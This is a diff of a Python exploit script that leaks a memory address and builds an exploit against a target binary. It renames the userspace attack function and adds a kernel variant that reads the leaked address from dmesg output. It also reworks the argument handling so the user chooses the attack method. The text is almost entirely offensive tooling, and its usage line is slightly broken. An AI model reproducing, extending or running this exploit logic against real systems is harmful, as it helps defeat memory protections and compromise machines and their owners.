@@ -153,7 +153,7 @@ def create_exploit(target_binary, payload_file, leak):
         o.write(exploit)
     return exploit
 
-def attack(target_binary, payload_file):
+def attack_userspace(target_binary, payload_file):
     leak, leaker = leaked(['./userspace', target_binary, payload_file],
             target_binary)
     print('Leaked address is', str(hex(leak)))
@@ -161,19 +161,29 @@ def attack(target_binary, payload_file):
     leaker.shutdown('send')
     leaker.shutdown()
 
+def attack_kernel(target_binary, payload_file):
+    leak, leaker = leaked(['dmesg'], target_binary)
+    leaker.shutdown()
+    print('Leaked address is', str(hex(leak)))
+    exploit = create_exploit(target_binary, payload_file, leak)
+
 def main():
     # Make sure we have enough args
-    if len(sys.argv) < 3:
-        print('Usage %s target_binary, payload_file [leak]'.format(sys.argv[1]))
+    if len(sys.argv) < 4:
+        print('Usage %s attack_method target_binary payload_file [leak]'.format(sys.argv[1]))
         sys.exit(1)
     # Set the common variables
-    target_binary = sys.argv[1]
-    payload_file = sys.argv[2]
+    attack_method = sys.argv[1]
+    target_binary = sys.argv[2]
+    payload_file = sys.argv[3]
     # Choose what to do baised on number of vars given
-    if len(sys.argv) == 3:
-        attack(target_binary, payload_file)
+    if len(sys.argv) == 4:
+        if attack_method == 'userspace':
+            attack_userspace(target_binary, payload_file)
+        elif attack_method == 'kernel':
+            attack_kernel(target_binary, payload_file)
     else:
-        leak = int(sys.argv[3], 16)
+        leak = int(sys.argv[4], 16)
         create_exploit(target_binary, payload_file, leak)
 
 if __name__ == '__main__':
